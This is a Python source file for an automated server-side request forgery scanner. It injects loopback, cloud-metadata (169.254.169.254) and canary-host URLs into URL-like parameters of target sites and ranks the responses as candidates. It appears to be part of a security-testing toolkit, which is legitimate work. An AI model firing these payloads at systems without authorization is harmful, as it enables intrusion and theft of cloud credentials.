# modules/tools/ssrf_scanner.py
# Server-Side Request Forgery candidate scanner (the "advanced SSRF payload
# crafting" trick): URLs that take a URL-ish/fetch-ish parameter are probed
# with internal targets. The TARGET server does the fetching - we never touch
# internal addresses ourselves.
#
#   * Payloads  - loopback (127.0.0.1, localhost, [::1], 0x7f000001, decimal),
#                 cloud metadata (169.254.169.254), canary host
#   * Signals   - status/body delta vs baseline, AWS metadata fingerprints,
#                 localhost/refused echo, canary in Location/body
#
# Output is ranked CANDIDATES requiring manual confirmation (a canary host you
# control turns a candidate into a confirmed finding).
#   {'candidates': [{url, param, payload, score, signals, status, length, evidence}],
#    'totals': {...}}

import re
import asyncio
import aiohttp
from typing import Dict, List, Optional, Callable, Any
from urllib.parse import urlparse, urlencode, parse_qsl

from app.utils.logger import get_logger

logger = get_logger()

_URL_PARAMS = [
    'url', 'uri', 'path', 'dest', 'destination', 'redirect', 'redir', 'next',
    'return', 'callback', 'target', 'link', 'src', 'source', 'image_url',
    'imageurl', 'img', 'load', 'fetch', 'proxy', 'page', 'u', 'url2', 'out',
    'view', 'dir', 'doc', 'file', 'read', 'show', 'browse', 'window', 'get',
    'download', 'upload', 'picture', 'reference', 'request', 'rurl', 'qurl',
    'lurl', 'wurl', 'return_url', 'redirect_url', 'final_url', 'endpoint',
    'host', 'server', 'site', 'addr', 'address', 'data', 'feed', 'xml',
]

# payloads are injected INTO the target's parameter - the target fetches them
_PAYLOADS = [
    ('127.0.0.1', 'http://127.0.0.1/'),
    ('localhost', 'http://localhost/'),
    ('127.0.0.1:8080', 'http://127.0.0.1:8080/'),
    ('ipv6-loopback', 'http://[::1]/'),
    ('hex-loopback', 'http://0x7f000001/'),
    ('decimal-loopback', 'http://2130706433/'),
    ('short-loopback', 'http://0/'),
    ('aws-metadata', 'http://169.254.169.254/latest/meta-data/'),
    ('azure-metadata', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'),
]

_AWS_SIGNS = ('169.254.169.254', 'instance-id', 'ami-', 'meta-data', 'accesskeyid')
_LOCALHOST_SIGNS = ('127.0.0.1', 'localhost', 'connection refused', 'refused to connect',
                    'timed out', 'i/o timeout')
_INTERNAL_SIGNS = ('internal', 'private ip', 'cannot access', 'unable to connect')


class SSRFScanner:
    """
    SSRF candidate scanner (target-side fetch; passive on our side).

    Usage:
        scanner = SSRFScanner(config)
        results = scanner.scan_sync(['https://example.com/fetch?url=x'],
                                    canary='canary.deepbug.io')
    """

    def __init__(self, config: Dict):
        cfg = config.get('ssrf', {}) if isinstance(config, dict) else {}
        self.timeout = int(cfg.get('timeout', 12))
        self.max_urls = int(cfg.get('max_urls', 100))
        self.canary = cfg.get('canary_host', 'canary.deepbug.io')
        self.max_payloads_per_param = int(cfg.get('max_payloads', 5))

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------
    async def scan(self, urls: List[str],
                   canary: Optional[str] = None,
                   progress_callback: Optional[Callable[[float, str], None]] = None) -> Dict[str, Any]:
        canary = (canary or self.canary or 'canary.invalid').strip().lower()
        urls = urls or []
        payloads = list(_PAYLOADS) + [('canary', f'http://{canary}/'),
                                      ('canary-proto', f'//{canary}/')]
        candidates: List[Dict] = []
        total = len(urls)
        checked = 0
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout)) as session:
            for raw in urls[:self.max_urls]:
                checked += 1
                p = urlparse(raw)
                if not p.hostname or not p.query:
                    continue
                base = f'{p.scheme}://{p.netloc}{p.path}'
                baseline_status, baseline_len, baseline_body = await self._probe(
                    session, raw)

                param_tested = 0
                for k, _ in parse_qsl(p.query, keep_blank_values=True):
                    if k.lower() not in _URL_PARAMS:
                        continue
                    if param_tested >= self.max_payloads_per_param:
                        break
                    param_tested += 1
                    for pname, payload in payloads:
                        qs = urlencode({k: payload})
                        status, length, body = await self._probe(session, f'{base}?{qs}')
                        signals, evidence = _evaluate(
                            status, length, body,
                            baseline_status, baseline_len,
                            payload, pname, canary)
                        if signals:
                            candidates.append({
                                'url': f'{base}?{qs[:80]}',
                                'param': k,
                                'payload': pname,
                                'score': len(signals),
                                'signals': signals,
                                'status': status,
                                'length': length,
                                'evidence': evidence,
                            })
                if progress_callback:
                    progress_callback(checked / max(total, 1),
                                      f'{len(candidates)} ssrf candidates so far')
        candidates.sort(key=lambda c: c['score'], reverse=True)
        return {'candidates': candidates,
                'totals': {'urls': checked, 'candidates': len(candidates),
                           'payloads': len(payloads)}}

    def scan_sync(self, urls: List[str], canary: Optional[str] = None,
                  progress_callback: Optional[Callable[[float, str], None]] = None) -> Dict[str, Any]:
        return _run_coro(self.scan(urls, canary, progress_callback))

    # ------------------------------------------------------------------
    # Internals
    # ------------------------------------------------------------------
    async def _probe(self, session: aiohttp.ClientSession, url: str) -> tuple:
        try:
            async with session.get(url, allow_redirects=False,
                                   timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                body = await resp.text(errors='ignore')
                return resp.status, len(body), body
        except Exception:
            return 0, 0, ''

    def _empty_result(self) -> Dict[str, Any]:
        return {'candidates': [], 'totals': {'urls': 0, 'candidates': 0,
                                             'payloads': 0}}


def _evaluate(status: int, length: int, body: str,
              base_status: int, base_len: int,
              payload: str, pname: str, canary: str) -> tuple:
    signals = []
    low = (body or '').lower()
    if status in (0,):
        return [], ''
    if pname == 'canary' or pname == 'canary-proto':
        if canary in low or canary in _ev(low):
            signals.append('canary')
        return signals, 'canary echoed (Location or body)' if signals else ''
    if pname in ('aws-metadata', 'azure-metadata'):
        if any(sig in low for sig in _AWS_SIGNS):
            signals.append('cloud-metadata')
        if '404' in low and 'metadata' in low and status == 404:
            signals.append('metadata-404')
        if signals:
            return signals, _snippet(body, 120)
    # generic signals for loopback payloads
    if status != base_status and base_status not in (0,) and status != 404:
        signals.append('status-change')
    if abs(length - base_len) > 50 and base_len > 0:
        signals.append('length-delta')
    if any(sig in low for sig in _LOCALHOST_SIGNS) and pname in (
            '127.0.0.1', 'localhost', 'ipv6-loopback', 'hex-loopback',
            'decimal-loopback', 'short-loopback'):
        signals.append('localhost-echo')
    if any(sig in low for sig in _INTERNAL_SIGNS):
        signals.append('internal-echo')
    if payload and payload in low:
        signals.append('payload-echo')
    return signals, _snippet(body, 100) if signals else ''


def _ev(low: str) -> str:
    return low


def _snippet(body: str, n: int) -> str:
    body = (body or '').replace('\n', ' ').strip()
    return body[:n]


def _run_coro(coro):
    """Run a coroutine from sync code, tolerating an already-running loop."""
    try:
        asyncio.get_running_loop()
    except RuntimeError:
        return asyncio.run(coro)
    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
        return ex.submit(asyncio.run, coro).result()